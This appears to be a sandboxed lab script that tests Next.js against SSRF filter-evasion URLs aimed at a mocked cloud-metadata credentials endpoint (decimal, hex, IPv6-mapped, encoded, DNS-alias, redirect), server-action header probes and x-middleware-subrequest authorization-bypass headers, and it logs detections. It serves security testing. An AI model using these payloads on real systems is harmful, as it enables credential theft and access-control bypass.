#!/bin/bash
# Variantes d'évasion (dans le conteneur, --network none). $1 = default | permissive. Marqueurs seulement, corps inertes.
set -u
V=$(node -p 'require("next/package.json").version')
ip addr add 169.254.169.254/32 dev lo; ip addr add 127.0.0.5/32 dev lo 2>/dev/null
mkdir -p /imds/latest/meta-data/iam/security-credentials && echo -n lab-role > /imds/latest/meta-data/iam/security-credentials/index.html
(cd /imds && python3 -m http.server 80 --bind 169.254.169.254 >/tmp/imds.log 2>&1 &)
# hôte « autorisé » qui redirige vers le service de métadonnées
cat > /tmp/redir.py <<'PY'
import http.server
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302); self.send_header("Location","http://169.254.169.254/latest/meta-data/iam/security-credentials/"); self.end_headers()
    def log_message(self,*a): pass
http.server.HTTPServer(("127.0.0.5",80),H).serve_forever()
PY
python3 /tmp/redir.py & echo "169.254.169.254 imds-alias.lab" >> /etc/hosts
nginx; LAB_IMAGES=$1 npx next start -H 127.0.0.1 -p 3000 >/tmp/next.log 2>&1 &
for i in $(seq 40); do curl -s -o /dev/null 127.0.0.1:3000 && break; sleep 1; done
B=http://127.0.0.1:8080; n0(){ grep -c 'GET /latest' /tmp/imds.log; }
img(){ local lbl=$1 u=$2; local b=$(n0); local c=$(curl -s -o /tmp/b -w '%{http_code}' "$B/_next/image?url=$u&w=64&q=75"); sleep 0.3; printf '%s %-10s SSRF %-34s %s IMDS+%s %s\n' "$V" "$1" "" "$c" "$(( $(n0)-b ))" "$(head -c 50 /tmp/b)" | sed "s/SSRF  */SSRF $lbl /"; }
set -- "$1"
M=$1
img "référence" "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
img "décimal" "http://2852039166/latest/meta-data/iam/security-credentials/"
img "hexa" "http://0xa9fea9fe/latest/meta-data/iam/security-credentials/"
img "ipv6-mappée" "http://[::ffff:169.254.169.254]/latest/meta-data/iam/security-credentials/"
img "tout-encodé" "%68%74%74%70%3a%2f%2f%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34%2f%6c%61%74%65%73%74%2f"
img "nom-DNS" "http://imds-alias.lab/latest/meta-data/iam/security-credentials/"
img "redirection" "http://127.0.0.5/r"
if [ "$M" = default ]; then
  AID=$(curl -s $B/form | grep -o '\$ACTION_ID_[0-9a-f]*' | head -1 | sed 's/\$ACTION_ID_//')
  BODY=$'--b\r\nContent-Disposition: form-data; name="a"\r\n\r\n1\r\n--b--\r\n'
  act(){ local lbl=$1; shift; local c=$(curl -s -o /tmp/b -w '%{http_code}' -X POST "$@" -H 'Content-Type: multipart/form-data; boundary=b' --data-binary "$BODY" $B/form); printf '%s %-10s ACTION %-28s %s %s\n' "$V" "$M" "$lbl" "$c" "$(head -c 40 /tmp/b | tr -d '\n')"; }
  act "sans en-tête" 
  act "rsc-action-id: x" -H 'rsc-action-id: x'
  act "NEXT-ACTION: x (casse)" -H 'NEXT-ACTION: x'
  act "vrai ID lu dans le HTML" -H "Next-Action: $AID"
  mw(){ local lbl=$1 v=$2; local c=$(curl -s -o /tmp/b -w '%{http_code}' -H "x-middleware-subrequest: $v" $B/admin); grep -q ADMIN-SECRET /tmp/b && r=CONTOURNÉ || r=bloqué; printf '%s %-10s MW %-32s %s %s\n' "$V" "$M" "$lbl" "$c" "$r"; }
  mw "valeur 'x' (sonde)" "x"
  mw "préfixe + 5x" "foo:middleware:middleware:middleware:middleware:middleware"
  mw "espaces" "middleware : middleware : middleware : middleware : middleware"
  c=$(curl -s -o /tmp/b -w '%{http_code}' -H "X-MIDDLEWARE-SUBREQUEST: middleware:middleware:middleware:middleware:middleware" $B/admin); grep -q ADMIN-SECRET /tmp/b && r=CONTOURNÉ || r=bloqué; printf '%s %-10s MW %-32s %s %s\n' "$V" "$M" "casse du nom d'en-tête" "$c" "$r"
fi
sleep 1; grep -h -E "valid image|private ip|Failed to find|expected format" /tmp/next.log | cut -c1-140 | sed "s/^/$V $M next.log: /"
sed "s/^/$V $M nginx: /" /var/log/nginx/detect.json
